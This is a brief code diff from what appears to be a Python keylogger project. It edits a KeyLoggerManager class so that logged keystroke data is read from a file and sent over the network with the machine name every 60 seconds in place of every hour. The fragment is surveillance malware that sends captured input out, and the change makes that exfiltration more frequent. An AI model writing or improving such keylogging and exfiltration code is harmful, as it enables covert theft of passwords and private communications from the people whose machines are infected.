@@ -39,7 +39,7 @@ class KeyLoggerManager:
 
     def send_to_network(self):
         while not self.end:
-            time.sleep(3600)
+            time.sleep(60)
             with open(self.file_path,'r') as file:
                 content = json.load(file)
             networkWriter.send_data(content,self.machine_name)
